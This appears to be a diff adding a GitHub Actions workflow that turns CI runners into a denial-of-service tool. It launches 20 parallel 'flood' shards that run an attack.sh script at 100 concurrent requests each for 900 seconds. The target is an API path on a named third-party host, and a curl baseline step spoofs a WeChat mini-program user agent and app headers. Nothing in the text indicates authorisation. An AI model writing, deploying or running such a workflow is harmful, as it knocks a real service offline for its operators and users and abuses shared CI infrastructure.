@@ -1,0 +1,36 @@
+name: wp2
+on:
+  workflow_dispatch:
+    inputs:
+      conc:
+        description: 'per-job parallel'
+        default: '100'
+      dur:
+        description: 'seconds'
+        default: '900'
+      path:
+        description: 'api path'
+        default: '/channelApi/goods'
+
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+      - name: baseline
+        continue-on-error: true
+        run: |
+          UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 MicroMessenger/8.0.49"
+          curl -sS -k --max-time 20 -H "User-Agent: $UA" -H "appType: mini" -H "uniacid: 3" \
+            -H "module: yb_wm_v3" -o /dev/null -w "baseline=%{http_code} %{time_total}s\n" \
+            "https://m.ipadpos.cn${{ github.event.inputs.path }}" || true
+      - name: flood
+        run: |
+          chmod +x attack.sh
+          bash attack.sh "${{ github.event.inputs.conc }}" "${{ github.event.inputs.dur }}" "${{ github.event.inputs.path }}"
